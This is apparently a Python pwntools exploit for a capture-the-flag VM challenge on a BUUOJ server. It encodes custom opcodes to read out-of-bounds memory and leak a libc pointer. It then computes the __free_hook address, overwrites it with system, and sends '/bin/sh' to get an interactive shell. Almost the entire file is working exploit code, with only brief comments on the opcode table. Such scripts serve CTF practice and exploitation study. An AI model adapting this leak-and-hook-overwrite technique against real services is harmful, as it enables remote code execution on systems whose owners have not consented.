from pwn import *
from LibcSearcher import *

target = remote('node4.buuoj.cn', 25476)
libc = ELF('libc-2.23.so')

'''
Opcode and instruction lookup table:

mov reg, src2		 	      0x10 : reg[dst] = src2
mov reg, 0				      0x20 : reg[dst] = 0
ldr [mem], reg          0x30 : reg[dst] = memory[reg[src2]]
str reg, [mem]          0x40 : memory[reg[src2]] = reg[dst]
push reg                0x50 : stack[result] = reg[dst]
pop reg                 0x60 : reg[dst] = stack[reg[13]]
add                     0x70 : reg[dst] = reg[src2] + reg[src1]
sub                     0x80 : reg[dst] = reg[src1] - reg[src2]
and                     0x90 : reg[dst] = reg[src2] & reg[src1]
or                      0xA0 : reg[dst] = reg[src2] | reg[src1]
xor          	        	0xB0 : reg[dst] = reg[src2] ^ reg[src1]
shl                     0xC0 : reg[dst] = reg[src1] << reg[src2]
shr                     0xD0 : reg[dst] = reg[src1] >> reg[src2]
                        0xFF : (exit or print) if(reg[13] != 0) print oper else exit?

'''

def create_inst(opcode, v4, v3, v2):
    res = opcode << 24
    res |= v4 << 16
    res |= v3 << 8
    res |= v2

    return str(res)


target.sendlineafter('PCPC: ', b'0')
target.sendlineafter('SP: ', b'1')
target.sendlineafter('CODE SIZE: ', b'19')
target.recvuntil('CODE: ')

# Send code.
# __free_hook - stderr_ptr - 0x8 = 0x10a0

# reg[0] = 26
target.sendline(create_inst(0x10, 0, 0, 26))
# reg[1] = reg[1] - reg[0]
target.sendline(create_inst(0x80, 1, 1, 0))
# ldr reg[0], [reg[1]]
target.sendline(create_inst(0x30, 0, 0, 1))
# reg[1] = 25
target.sendline(create_inst(0x10, 1, 0, 25))
# reg[2] = reg[2] - reg[1]
target.sendline(create_inst(0x80, 2, 2, 1))
# ldr reg[1], [reg[2]]
target.sendline(create_inst(0x30, 1, 0, 2))
# Now reg[1] -> higher 32 bits; reg[0] -> lower 32 bits.
# reg[3] = 0xa0
target.sendline(create_inst(0x10, 3, 0, 0xa0))
# reg[4] = 1, reg[5] = 12
target.sendline(create_inst(0x10, 4, 0, 1))
target.sendline(create_inst(0x10, 5, 0, 12))
# reg[4] <<= 12
target.sendline(create_inst(0xc0, 4, 4, 5))
# reg[3] = reg[3] + reg[4] => 0x10a0
target.sendline(create_inst(0x70, 3, 3, 4))
# reg[3] = reg[3] + reg[0] => stderr + offset => __free_hook - 8.
target.sendline(create_inst(0x70, 3, 3, 0))

# # Leak __free_hook - 8.
# reg[5] = 8
target.sendline(create_inst(0x10, 5, 0, 8))
target.sendline(create_inst(0x80, 6, 6, 5))
# str [reg[6]], reg[3] ; free_hook - 8 lower
target.sendline(create_inst(0x40, 3, 0, 6))
# reg[7] = 7
target.sendline(create_inst(0x10, 7, 0, 7))
target.sendline(create_inst(0x80, 8, 8, 7))
# str [reg[8]], reg[1] ; free_hook - 8 higher
target.sendline(create_inst(0x40, 1, 0, 8))

# Print regs.
target.sendline(create_inst(0xff, 0, 0, 0))

# Get __free_hook - 8.
target.recvuntil('R1: ')
higher = int(target.recv(4), 16)
target.recvuntil('R3: ')
lower  = int(target.recv(8), 16)
free_hook = higher * (2 ** 32) + lower + 8
print('[+] __free_hook addr:', hex(free_hook))

base = free_hook - libc.sym['__free_hook']
system = libc.sym['system'] + base
target.sendline(b'/bin/sh\x00' + p64(system))

target.interactive()
